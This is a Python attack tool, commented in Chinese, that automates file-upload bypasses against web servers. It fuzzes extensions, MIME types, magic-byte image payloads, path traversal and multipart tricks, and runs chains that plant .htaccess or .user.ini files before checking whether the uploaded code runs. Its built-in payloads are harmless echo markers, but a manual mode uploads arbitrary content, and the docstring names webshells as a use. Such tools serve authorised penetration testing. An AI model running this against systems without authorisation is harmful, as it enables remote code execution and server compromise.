r"""upload_test 工具入口:文件上传漏洞检测与绕过。

op 分发({op,url,...};兼容旧脚本调用 {op,params}):
  manual  全维度可控单发:文件名/MIME/上传方式(multipart|raw)/字段/额外表单/头;
          响应+路径候选回显,check_url 可顺带 GET 验证(怪链分步手玩的抓手)
  fuzz    单发变体矩阵(按族:ext/mime/content/parser/filename/request)
          + 链式剧本(.htaccess/.user.ini/nginx pathinfo/IIS/二次渲染存活),
          内置验证闭环:上传→落点发现(响应回显>Location>upload_dir>常见目录)
          →GET 查无害 marker 是否执行;失败响应按签名归并防刷屏

马甲载荷恒为无害 echo marker,不预置真 webshell——传真马走 manual 自带 content。
链式剧本最后跑:.htaccess/.user.ini 是目录级副作用,先跑会污染单发矩阵的验证。
退出码:0=完成(结果可以是"未发现绕过");1=连不上/中途断网;2=参数校验失败。
纯 stdlib(urllib 手搓 multipart),零第三方依赖,无本地文件副作用。
"""
import hashlib
import json
import mimetypes
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.stderr.reconfigure(encoding="utf-8", errors="replace")

MARKER = "upk_" + hashlib.md5(b"upload_probe").hexdigest()[:16]
PAYLOADS = {                       # 无害回显载荷:验证执行用,不是 webshell
    "php": f'<?php echo "{MARKER}";?>',
    "asp": f'<%Response.Write "{MARKER}"%>',
    "aspx": f'<%Response.Write("{MARKER}")%>',
    "jsp": f'<%out.print("{MARKER}");%>',
}
LANG_EXT = {
    "php": ["php", "phtml", "php3", "php4", "php5", "php7", "phps", "pht"],
    "asp": ["asp", "asa", "cer", "cdx"],
    "aspx": ["aspx", "ashx", "asmx"],
    "jsp": ["jsp", "jspx", "jspa", "jspf"],
}
# 黑名单"删一次关键词"型过滤的双写搭档:pphphp 删 php 一次恰剩 php
DOUBLE_WRITE = {"php": "pphphp", "asp": "aaspsp", "jsp": "jjspsp"}
MAGIC = {
    "gif": b"GIF89a",
    "jpg": b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x00",
    "png": b"\x89PNG\r\n\x1a\n",
    "bmp": b"BM",
}
COMMON_DIRS = ["upload", "uploads", "upfile", "uploadfile", "uploadfiles",
               "files", "attached", "data", "img", "images", "static/uploads"]
FAMILIES = ("ext", "mime", "content", "parser", "filename", "request", "chain")
DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) upload_test/1.0"
SNIPPET = 70                       # 响应摘要在报告里的长度


class TransportError(Exception):
    """网络层失败(连不上/断网)——区别于 HTTP 4xx/5xx(那是有效结果)。"""


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a):
        return None


def _http(method, url, body=None, headers=None, timeout=10, follow=True):
    """返回 (status, headers_dict, body_bytes)。HTTPError 也是有效响应;
    上传用 follow=False 抓 302+Location(跟随会把落点信息冲掉)。"""
    opener = (urllib.request.build_opener() if follow
              else urllib.request.build_opener(_NoRedirect()))
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, dict(r.headers.items()), r.read(512_000)
    except urllib.error.HTTPError as e:            # 4xx/5xx/3xx(no-follow)都是结果
        try:
            raw = e.read(512_000)
        except Exception:
            raw = b""
        return e.code, dict(e.headers.items()), raw
    except (urllib.error.URLError, OSError, ValueError) as e:
        raise TransportError(str(e) or type(e).__name__)


def _multipart(field, filename, content: bytes, ctype, extra: dict, disp=None):
    """手搓 multipart。disp 可整体覆盖文件部件的 Content-Disposition(请求结构族的
    filename*/不引号/双 filename 技巧全靠它)。ctype=None 表示干脆不发 Content-Type 头。"""
    b = uuid.uuid4().hex
    parts = []
    for k, v in (extra or {}).items():
        parts.append(f'--{b}\r\nContent-Disposition: form-data; name="{k}"'
                     f"\r\n\r\n{v}\r\n".encode("utf-8"))
    cd = disp if disp is not None else \
        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"'
    head = f"--{b}\r\n{cd}\r\n"
    if ctype:
        head += f"Content-Type: {ctype}\r\n"
    head += "\r\n"                    # 头与内容之间的空行（漏了它整个部件都解析不出）
    parts.append(head.encode("utf-8", "surrogateescape") + content + b"\r\n")
    parts.append(f"--{b}--\r\n".encode())
    return b"".join(parts), f"multipart/form-data; boundary={b}"


def _snippet(body: bytes, n: int = SNIPPET) -> str:
    text = " ".join(body.decode("utf-8", "replace").split())
    return text[:n] + ("…" if len(text) > n else "")


def _uniq(fn: str, i: int) -> str:
    """单发变体文件名加唯一前缀,落点验证不互相撞车;穿越类名字只加在 basename 上。"""
    sep = "/" if "/" in fn else ("\\" if "\\" in fn else "")
    if not sep:
        return f"u{i}_{fn}"
    head, _, base = fn.rpartition(sep)
    return f"{head}{sep}u{i}_{base}"


def _stem(fn: str) -> str:
    """去掉最后一段扩展名——服务端改名保存(双写被净化成 .php)时靠它宽松回显匹配。"""
    base = fn.rpartition("/")[2].rpartition("\\")[2]
    return base.rsplit(".", 1)[0] if "." in base else base


def _dir_of(url: str) -> str:
    return url.rpartition("/")[0] if "/" in url[len("http://"):] else url


def _origin_of(url: str) -> str:
    parts = urllib.parse.urlsplit(url)
    return f"{parts.scheme}://{parts.netloc}"


def _landing(origin, url_dir, body_text, headers, fn, upload_dir):
    """落点候选三阶梯:响应回显(精确名>stem)>Location>upload_dir>常见目录。"""
    cands, seen = [], set()

    def add(u):
        u = u.strip().rstrip('",;)')
        if u and u not in seen:
            seen.add(u)
            cands.append(u)

    def norm(frag):
        if frag.startswith(("http://", "https://")):
            add(frag)
        elif frag.startswith("/"):
            add(origin + frag)
        else:
            add(url_dir + "/" + frag)

    for pat_str in (fn, _stem(fn)):
        for m in re.finditer(r'[^"\'<>\s]*' + re.escape(pat_str)
                             + r'[^"\'<>\s]*', body_text):
            norm(m.group(0))
    loc = headers.get("Location") or headers.get("location")
    if loc:
        norm(loc)
    if upload_dir:
        ud = upload_dir if upload_dir.startswith("http") else \
            origin + (upload_dir if upload_dir.startswith("/") else "/" + upload_dir)
        add(ud.rstrip("/") + "/" + urllib.parse.quote(fn))
    for d in COMMON_DIRS:
        add(f"{origin}/{d}/{urllib.parse.quote(fn)}")
    add(f"{url_dir}/{urllib.parse.quote(fn)}")
    return cands[:32]


def _verify(cands, payload: bytes, timeout, expect="exec", headers=None):
    """逐候选 GET。exec=裸 marker 回显;content=载荷原文存活(二次渲染)。
    返回 (verdict, url):exec / stored / ('', '')。
    执行≠存储:存储文件的 GET 回的是源码,源码里本来就有 marker 字符串——
    必须同时要求"marker 在而载荷前缀不在"才算真执行。"""
    probe = payload[:24].decode("utf-8", "replace")
    stored = ("", "")
    for u in cands:
        try:
            status, _, raw = _http("GET", u, headers=headers, timeout=timeout)
        except TransportError:
            continue
        if status != 200:
            continue
        text = raw.decode("utf-8", "replace")
        if expect == "exec" and MARKER in text and not (probe and probe in text):
            return "exec", u
        if probe and probe in text:
            if expect == "content":
                return "stored", u
            stored = stored if stored[0] else ("stored", u)
    return stored


def _base_headers(common):
    h = {"User-Agent": common["ua"], **common["headers"]}
    if common["cookies"]:
        h["Cookie"] = common["cookies"]
    return h


def _upload(url, spec, common):
    """发一次上传。spec: filename/content(bytes)/ctype/disp/extra。"""
    body, ct = _multipart(
        spec.get("field") or common["field"], spec["filename"], spec["content"],
        spec.get("ctype"), {**common["extra"], **(spec.get("extra") or {})},
        spec.get("disp"))
    headers = {"Content-Type": ct, **_base_headers(common)}
    return _http(spec.get("method") or "POST", url, body, headers,
                 common["timeout"], follow=False)


def _common_of(p: dict) -> dict:
    extra = p.get("extra_fields")
    if extra is not None and not isinstance(extra, dict):
        fail("extra_fields 要 {字段:值} 对象", 2)
    headers = p.get("headers")
    if headers is not None and not isinstance(headers, dict):
        fail("headers 要 {名:值} 对象", 2)
    timeout = int(p.get("timeout_s", 10))
    if not 1 <= timeout <= 60:
        fail("timeout_s 必须在 1–60 秒之间", 2)
    return {"field": str(p.get("field") or "file"),
            "ua": str(p.get("ua") or DEFAULT_UA),
            "cookies": str(p.get("cookies") or ""),
            "headers": {str(k): str(v) for k, v in (headers or {}).items()},
            "extra": {str(k): str(v) for k, v in (extra or {}).items()},
            "timeout": timeout}


# ════════════════ manual:全维度可控单发 ════════════════

def op_manual(p: dict) -> int:
    url = str(p.get("url") or "")
    if not url.startswith(("http://", "https://")):
        fail("manual: params.url 必填(http(s):// 开头)")
    mode = str(p.get("body_mode") or "multipart")
    if mode not in ("multipart", "raw"):
        fail(f"未知 body_mode {mode!r}: multipart/raw")
    method = str(p.get("method") or "POST")
    if method not in ("POST", "PUT"):
        fail(f"未知 method {method!r}: POST/PUT")

    if p.get("content_hex"):
        try:
            content = bytes.fromhex(str(p["content_hex"]))
        except ValueError as e:
            fail(f"content_hex 不是合法 hex: {e}")
    elif p.get("content") is not None:
        content = str(p["content"]).encode("utf-8")
    else:
        fail("manual: params.content(文本) 或 params.content_hex(二进制) 必填一个")

    filename = str(p.get("filename") or "")
    if mode == "multipart" and not filename:
        fail("manual: body_mode=multipart 时 params.filename 必填(raw 模式可省)")
    common = _common_of(p)
    ctype = p.get("content_type")
    if mode == "multipart":
        body, ct = _multipart(str(p.get("field") or "file"), filename, content,
                              ctype or (mimetypes.guess_type(filename)[0]
                                        or "application/octet-stream"),
                              common["extra"],
                              None)
    else:                                          # raw:content 直接当请求体
        body = content
        ct = ctype or "application/octet-stream"

    headers = {"Content-Type": ct, **_base_headers(common)}
    print(f"[manual] {method} {url} · {mode}"
          + (f" · 字段={p.get('field') or 'file'} · 文件名={filename!r}"
             if mode == "multipart" else ""))
    try:
        status, hdrs, raw = _http(method, url, body, headers,
                                  common["timeout"], follow=False)
    except TransportError as e:
        fail(f"连不上 {url}: {e}", 1)
    print(f"→ {status}")
    for k in ("Location", "Content-Type"):
        if hdrs.get(k):
            print(f"  {k}: {hdrs[k]}")
    print(f"  body: {_snippet(raw, 400)}")

    if mode == "multipart":
        origin, url_dir = _origin_of(url), _dir_of(url)
        cands = _landing(origin, url_dir, raw.decode("utf-8", "replace"),
                         hdrs, filename, p.get("upload_dir"))
        if cands:
            print("路径候选(按可能性排序,用 web_fetch GET 验证执行):")
            for u in cands[:5]:
                print(f"  {u}")

    check = str(p.get("check_url") or "")
    if check:
        try:
            status2, _, raw2 = _http("GET", check, headers=_base_headers(common),
                                     timeout=common["timeout"])
        except TransportError as e:
            print(f"[check] GET {check} 失败: {e}")
            return 0
        text = raw2.decode("utf-8", "replace")
        probe = content[:24].decode("utf-8", "replace")
        verdict = ("已验证执行 ✔ (marker 回显)" if status2 == 200 and MARKER in text and not (probe and probe in text) else
                   "已存储未执行(原文可见)" if status2 == 200 and probe and probe in text else
                   f"不可达/无内容({status2})")
        print(f"[check] GET {check} → {status2} · {verdict}")
    return 0


# ════════════════ fuzz:变体矩阵 + 链式剧本 ════════════════

def _build_singles(lang: str, level: str) -> list:
    exts, P = LANG_EXT[lang], LANG_EXT[lang][0]
    full = level == "full"
    out = []

    def add(family, tech, fn, **kw):
        out.append({"family": family, "tech": tech, "filename": fn, **kw})

    # ── ext:扩展名族 ──
    for e in exts:
        add("ext", f"备用后缀 {e}", f"shell.{e}")
    for label, fn in [("大小写-全大", f"shell.{P.upper()}"),
                      ("大小写-混合", f"shell.{P[0].upper()}{P[1:]}"),
                      ("末尾空格", f"shell.{P} "),
                      ("末尾点", f"shell.{P}."),
                      ("::$DATA(NTFS)", f"shell.{P}::$DATA")]:
        add("ext", label, fn)
    if DOUBLE_WRITE.get(lang):
        add("ext", "双写(净化一次后复原)", f"shell.{DOUBLE_WRITE[lang]}")
    if full:
        for e in exts[1:]:
            add("ext", f"备用后缀大写 {e.upper()}", f"shell.{e.upper()}")
        add("ext", "备用后缀+空格", f"shell.{exts[1]} ")
        add("ext", "备用后缀+点", f"shell.{exts[1]}.")
        for cross in ("asp", "aspx", "jsp", "jspx"):
            if cross not in exts:
                add("ext", f"跨语言试探 {cross}", f"shell.{cross}")

    # ── mime:类型伪装族 ──
    for mt in ("image/jpeg", "image/png", "text/plain"):
        add("mime", f"MIME 伪装 {mt}+本征后缀", f"shell.{P}", ctype=mt)
    add("mime", "jpg 名+octet-stream", "shell.jpg", ctype="application/octet-stream")
    add("mime", "jpg 名+正牌 image/jpeg(仅 MIME 校验场景)", "shell.jpg", ctype="image/jpeg")
    add("mime", "gif 名+正牌 image/gif(仅 MIME 校验场景)", "shell.gif", ctype="image/gif")
    if full:
        add("mime", "省略 Content-Type 头", f"shell.{P}", ctype=None)

    # ── content:魔头图片马族 ──
    for ext, label in (("gif", "GIF89a 魔头"), ("jpg", "JPEG 魔头"), ("png", "PNG 魔头")):
        add("content", label, f"shell.{ext}", prefix=MAGIC[ext], ctype=f"image/{ext}")
    if full:
        add("content", "BMP 魔头", "shell.bmp", prefix=MAGIC["bmp"], ctype="image/bmp")
        add("content", "GIF89a+空行分隔", "shell.gif",
            prefix=MAGIC["gif"] + b"\r\n\r\n", ctype="image/gif")

    # ── parser:双扩展族(链式的解析剧本在 _build_chains) ──
    for label, fn in [("双扩展 jpg.php", "shell.jpg.php"),
                      ("中段 php(.php.jpg)", "shell.php.jpg"),
                      ("php.txt", "shell.php.txt"),
                      ("php+未知尾缀(Apache 多解析)", "shell.php.xyz")]:
        add("parser", label, fn)
    if full:
        add("parser", "php.png", "shell.php.png")
        add("parser", "a.php.a(首尾夹击)", "shell.a.php.a")

    # ── filename:文件名族 ──
    for label, fn in [("路径穿越 1 层", f"../shell.{P}"),
                      ("路径穿越 2 层", f"../../shell.{P}"),
                      ("反斜杠穿越(Windows)", f"..\\shell.{P}"),
                      ("%00 截断(编码)", f"shell.{P}%00.jpg"),
                      ("双点分隔", f"shell..{P}"),
                      ("分号截断", f"shell.{P};a=1")]:
        add("filename", label, fn)
    if full:
        add("filename", "%00 截断(裸 NUL)", f"shell.{P}\x00.jpg")
        add("filename", "编码穿越 %2e%2e%2f", f"%2e%2e%2fshell.{P}")
        add("filename", "超长文件名", "x" * 160 + f".{P}")

    # ── request:请求结构族(disp 整体覆盖,{fn} 占位) ──
    add("request", "RFC5987 filename*",
        f"shell.{P}",
        disp_tmpl='Content-Disposition: form-data; name="{field}"; '
                  "filename*=UTF-8''{qfn}")
    add("request", "filename 不加引号",
        f"shell.{P}",
        disp_tmpl="Content-Disposition: form-data; name={field}; filename={fn}")
    add("request", "双 filename(首 jpg 尾本征,解析器取末个)",
        f"shell.{P}",
        disp_tmpl='Content-Disposition: form-data; name="{field}"; '
                  'filename="{fn}.jpg"; filename="{fn}"')
    if full:
        add("request", "filename+冗余参数",
            f"shell.{P}",
            disp_tmpl='Content-Disposition: form-data; name="{field}"; '
                      'filename="{fn}"; size="1024"')
        add("request", "IE 全路径文件名",
            f"shell.{P}",
            disp_tmpl='Content-Disposition: form-data; name="{field}"; '
                      'filename="C:\\fake\\{fn}"')
    return out


def _build_chains() -> list:
    """链式剧本:多步序列而非单发。文件名不加唯一前缀——IIS 的 'x.asp/.' 这类
    名字改一个字符就失效;链间共用 c_shell.jpg 是覆盖语义,不碍事。
    fast 取 4 条经典,full 全量 7 条。"""
    return [
        {"name": ".htaccess AddType(Apache+AllowOverride)", "fast": True,
         "uploads": [{"filename": ".htaccess",
                      "content": b"AddType application/x-httpd-php .jpg",
                      "ctype": "text/plain"},
                     {"filename": "c_shell.jpg", "payload": "php", "ctype": "image/jpeg"}],
         "verify": {"mode": "exec", "on": 1}},
        {"name": ".user.ini auto_prepend_file(PHP CGI/FPM)", "fast": True,
         "uploads": [{"filename": ".user.ini",
                      "content": b"auto_prepend_file=c_shell.jpg",
                      "ctype": "text/plain"},
                     {"filename": "c_shell.jpg", "payload": "php", "ctype": "image/jpeg"}],
         "verify": {"mode": "user_ini", "on": 1}},
        {"name": "nginx pathinfo(cgi.fix_pathinfo)", "fast": True,
         "uploads": [{"filename": "c_shell.jpg", "payload": "php", "ctype": "image/jpeg"}],
         "verify": {"mode": "pathinfo", "on": 0}},
        {"name": "二次渲染存活(非执行,查载荷字节)", "fast": True,
         "uploads": [{"filename": "c_shell.gif", "payload": "php", "ctype": "image/gif",
                      "prefix": MAGIC["gif"]}],
         "verify": {"mode": "content", "on": 0}},
        {"name": ".htaccess AddHandler", "fast": False,
         "uploads": [{"filename": ".htaccess",
                      "content": b"AddHandler application/x-httpd-php .jpg",
                      "ctype": "text/plain"},
                     {"filename": "c_shell.jpg", "payload": "php", "ctype": "image/jpeg"}],
         "verify": {"mode": "exec", "on": 1}},
        {"name": ".htaccess SetHandler(全目录 php)", "fast": False,
         "uploads": [{"filename": ".htaccess",
                      "content": b"SetHandler application/x-httpd-php",
                      "ctype": "text/plain"},
                     {"filename": "c_shell.jpg", "payload": "php", "ctype": "image/jpeg"}],
         "verify": {"mode": "exec", "on": 1}},
        {"name": "IIS 6.0 目录解析(/x.asp/1.jpg)", "fast": False,
         "uploads": [{"filename": "c_shell.asp/.", "payload": "asp",
                      "ctype": "application/octet-stream"}],
         "verify": {"mode": "iis", "on": 0}},
    ]


def _detect_field(url, common):
    """GET 上传页,解析 input[type=file] 的 name;拿不到兜底 file。"""
    try:
        _, _, raw = _http("GET", url, headers=_base_headers(common),
                          timeout=common["timeout"])
        html = raw.decode("utf-8", "replace")
        m = (re.search(r'<input[^>]*type=["\']?file["\']?[^>]*?name=["\']?(\w+)', html, re.I)
             or re.search(r'name=["\']?(\w+)[^>]*?type=["\']?file["\']?', html, re.I))
        if m:
            return m.group(1)
    except TransportError:
        pass
    return "file"


def op_fuzz(p: dict) -> int:
    url = str(p.get("url") or "")
    if not url.startswith(("http://", "https://")):
        fail("fuzz: params.url 必填(http(s):// 开头)")
    lang = str(p.get("lang") or "php")
    if lang not in PAYLOADS:
        fail(f"未知 lang {lang!r}: {'/'.join(PAYLOADS)}")
    level = str(p.get("level") or "fast")
    if level not in ("fast", "full"):
        fail(f"未知 level {level!r}: fast/full")
    fams = str(p.get("families") or "all").strip().lower()
    want = None if fams in ("", "all") else {x.strip() for x in fams.split(",") if x.strip()}
    if want and (bad := want - set(FAMILIES)):
        fail(f"未知族 {sorted(bad)}: {'/'.join(FAMILIES)} 或 all")
    common = _common_of(p)
    delay_ms = p.get("delay_ms")
    delay = (int(delay_ms) if delay_ms is not None else 150) / 1000
    if not 0 <= delay <= 5:
        fail("delay_ms 必须在 0–5000 之间", 2)
    if not p.get("field"):
        common["field"] = _detect_field(url, common)
    upload_dir = p.get("upload_dir")
    payload = PAYLOADS[lang].encode()

    singles = [v for v in _build_singles(lang, level)
               if want is None or v["family"] in want]
    chains = [c for c in _build_chains()
              if (want is None or "chain" in want) and (level == "full" or c["fast"])]
    print(f"[fuzz] POST {url} · 字段={common['field']} · 语言={lang} · 级别={level}"
          f" · 单发 {len(singles)} 条 + 链式 {len(chains)} 个 · 延迟 {int(delay * 1000)}ms")

    origin, url_dir = _origin_of(url), _dir_of(url)
    rows, exec_hits, net_fail = [], [], 0

    def run_variant(i, v):
        nonlocal net_fail
        fn = _uniq(v["filename"], i)
        content = v.get("prefix", b"") + payload
        spec = {"filename": fn, "content": content,
                "ctype": v.get("ctype", "application/octet-stream")}
        if v.get("disp_tmpl"):
            spec["disp"] = (v["disp_tmpl"]
                            .replace("{field}", common["field"])
                            .replace("{qfn}", urllib.parse.quote(fn))
                            .replace("{fn}", fn))
        try:
            status, hdrs, raw = _upload(url, spec, common)
        except TransportError as e:
            net_fail += 1
            if net_fail >= 3:
                _print_rows(rows)
                _summary(exec_hits, rows)
                fail(f"目标连续不可达({e}),已中止。以上为部分结果", 1)
            return ("net", v["family"], v["tech"], fn, 0, str(e)[:SNIPPET], "", "")
        net_fail = 0
        verdict, vurl = "", ""
        if status < 400:
            cands = _landing(origin, url_dir, raw.decode("utf-8", "replace"),
                             hdrs, fn, upload_dir)
            verdict, vurl = _verify(cands, content, common["timeout"],
                                    headers=_base_headers(common))
        return ("ok", v["family"], v["tech"], fn, status,
                _snippet(raw), verdict, vurl)

    stopped = False
    for i, v in enumerate(singles):
        row = run_variant(i, v)
        rows.append(row)
        if row[6] == "exec":
            exec_hits.append((row[2], row[7]))
            if p.get("stop_first"):
                stopped = True
                break
        if delay:
            time.sleep(delay)

    _print_rows(rows)
    if stopped:
        print(f"── stop_first:已验证可执行,单发提前停止(剩 {len(singles) - len(rows)} 条未发,链式跳过) ──")
        _summary(exec_hits, rows)
        return 0

    if chains:
        print(f"── 链式剧本({len(chains)})── 目录级副作用,此后目录行为可能已改变")
        for ci, ch in enumerate(chains):
            line = _run_chain(ci, ch, url, common, origin, url_dir, upload_dir)
            print(line)
            if line.startswith("[执]"):
                exec_hits.append((ch["name"], line.split("→", 1)[1].strip(" →")))
                if p.get("stop_first"):
                    print("── stop_first:链式已验证可执行,剩余链式跳过 ──")
                    break

    _summary(exec_hits, rows)
    return 0


def _print_rows(rows):
    if not rows:
        return
    print(f"── 单发矩阵({len(rows)})──")
    sig_count = {}
    for kind, family, tech, fn, status, snip, verdict, vurl in rows:
        if verdict == "exec":
            print(f"[执] {family}|{tech} {fn!r} → {status} | {vurl} ✔")
        elif verdict == "stored":
            print(f"[存] {family}|{tech} {fn!r} → {status} | {vurl} 存储未执行")
        elif kind == "net":
            print(f"[网] {family}|{tech} {fn!r} → 网络失败 {snip}")
        elif status >= 400:
            sig = (status, snip[:40])
            sig_count[sig] = sig_count.get(sig, 0) + 1
            if sig_count[sig] == 1:
                print(f"[拒] {family}|{tech} {fn!r} → {status} {snip}")
        else:
            print(f"[?] {family}|{tech} {fn!r} → {status} 落点未找到(可能假成功/目录不常见,试 upload_dir)")
    for (status, snip), n in sig_count.items():
        if n > 1:
            print(f"    └ 同类拒绝响应 ×{n - 1} 条已归并({status} {snip})")


def _run_chain(ci, ch, url, common, origin, url_dir, upload_dir):
    """跑一个链式剧本,返回一行结果。uploads 逐个上,任一步被拒即断。"""
    land = ""
    for si, step in enumerate(ch["uploads"]):
        fn = step["filename"]                      # 链式名保持原样(见 _build_chains 注释)
        content = step.get("prefix", b"") + (PAYLOADS[step["payload"]].encode()
                                             if step.get("payload") else step["content"])
        spec = {"filename": fn, "content": content, "ctype": step.get("ctype")}
        try:
            status, hdrs, raw = _upload(url, spec, common)
        except TransportError as e:
            return f"[网] 链 {ch['name']} → 网络失败 {str(e)[:SNIPPET]}"
        if status >= 400:
            return (f"[败] 链 {ch['name']} → {fn!r} 被拒({status}) "
                    f"{_snippet(raw, 40)};后续步骤未执行")
        if si == ch["verify"]["on"]:
            cands = _landing(origin, url_dir, raw.decode("utf-8", "replace"),
                             hdrs, fn, upload_dir)
            verdict, land = _verify(
                cands, content, common["timeout"],
                expect="content" if ch["verify"]["mode"] == "content" else "exec",
                headers=_base_headers(common))
            if not land and ch["verify"]["mode"] not in ("user_ini", "pathinfo", "iis"):
                return f"[败] 链 {ch['name']} → 上传成功但落点未找到(试 upload_dir 指定保存目录)"

    mode = ch["verify"]["mode"]
    if mode == "exec":
        return (f"[执] 链 {ch['name']} → 验证通过 {land} ✔" if verdict == "exec"
                else f"[败] 链 {ch['name']} → 上传成功但未执行(存储/落点问题)")
    if mode == "content":
        return (f"[存] 链 {ch['name']} → 载荷在渲染后文件中存活 {land}" if land
                else f"[败] 链 {ch['name']} → 载荷被二次渲染清除或落点未找到")

    # pathinfo / user_ini / iis:从 payload 落点目录推导特殊 verify 路径
    pfn = ch["uploads"][ch["verify"]["on"]]["filename"]
    if land:
        probes = [land.rpartition("/")[0]]
    else:
        probes = []
        if upload_dir:
            probes.append(upload_dir if upload_dir.startswith("http") else
                          origin + (upload_dir if upload_dir.startswith("/")
                                    else "/" + upload_dir))
        probes += [f"{origin}/{d}" for d in ("uploads", "upload", "upfile", "files")]
    suffix = {"pathinfo": f"/{pfn}/x.php",
              "user_ini": "/index.php",
              "iis": "/" + pfn.rpartition("/")[0] + "/1.jpg"}[mode]
    vstep = ch["uploads"][ch["verify"]["on"]]
    vprobe = (vstep.get("prefix", b"") + (PAYLOADS[vstep["payload"]].encode()
              if vstep.get("payload") else vstep["content"]))[:24].decode("utf-8", "replace")
    for d in probes:
        try:
            s, _, raw = _http("GET", d.rstrip("/") + suffix,
                              headers=_base_headers(common), timeout=common["timeout"])
        except TransportError:
            continue
        text = raw.decode("utf-8", "replace")
        # 同 _verify:裸 marker 才算执行,吐回源码只算打到了文件本身
        if s == 200 and MARKER in text and not (vprobe and vprobe in text):
            return f"[执] 链 {ch['name']} → {d.rstrip('/')}{suffix} ✔"
    why = {"pathinfo": "未触发 /x.jpg/x.php 解析",
           "user_ini": "index.php 未带出 marker(目录里可能没有 .php 触发文件,manual 传一个再试)",
           "iis": "IIS 目录解析未触发(现代环境本就罕见)"}[mode]
    return f"[败] 链 {ch['name']} → {why}"


def _summary(exec_hits, rows):
    stored = sum(1 for r in rows if r[6] == "stored")
    rejected = sum(1 for r in rows if r[4] >= 400)
    nolanding = sum(1 for r in rows if r[0] == "ok" and r[4] < 400 and not r[6])
    print("── 汇总 ──")
    if exec_hits:
        print(f"已验证可执行: {len(exec_hits)}")
        for tech, u in exec_hits:
            print(f"  {tech} → {u}")
    else:
        print("已验证可执行: 0(矩阵未打通;考虑 full 级别/upload_dir/怪链 manual 手玩)")
    print(f"存储未执行: {stored} · 落点未找到: {nolanding} · 被拒: {rejected}")


def fail(msg: str, code: int = 2):
    print(msg, file=sys.stderr)
    sys.exit(code)


OPS = {"manual": op_manual, "fuzz": op_fuzz}


def main() -> int:
    try:
        req = json.loads(sys.argv[1])
    except (IndexError, json.JSONDecodeError) as e:
        fail(f"参数必须是 JSON 对象: {e}")
    if not isinstance(req, dict):
        fail("参数必须是 JSON 对象", 2)
    op = str(req.get("op") or "")
    params = req.get("params") if "params" in req else {k: v for k, v in req.items() if k != "op"}
    if not isinstance(params, dict):
        fail("params 必须是对象", 2)
    fn = OPS.get(op)
    if not fn:
        fail(f"未知 op {op!r}。可用: {'/'.join(OPS)}", 2)
    try:
        return fn(params)
    except (TypeError, ValueError) as e:
        fail(f"参数无效: {e}", 2)


if __name__ == "__main__":
    sys.exit(main())
